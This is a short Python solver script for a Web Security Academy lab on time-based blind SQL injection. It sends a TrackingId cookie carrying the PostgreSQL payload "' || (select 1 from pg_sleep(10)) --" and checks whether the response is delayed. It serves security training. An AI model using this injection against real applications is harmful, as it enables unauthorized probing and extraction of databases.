from web_security_academy.core.logger import logger
import time


def solve_lab(session):
    logger.info(
        f'Causing a 10 second delay by visiting "/" with the following cookies:'
    )
    logger.info('{"TrackingId": "\' || (select 1 from pg_sleep(10)) --"}')

    cookies = {"TrackingId": "' || (select 1 from pg_sleep(10)) --"}
    start = time.perf_counter()
    session.get_path("/", cookies=cookies)
    end = time.perf_counter()

    response_time = end - start
    if response_time > 10:
        logger.success(f"Response time: {response_time} seconds")
    else:
        logger.failure(f"Response time: {response_time} seconds")
        return
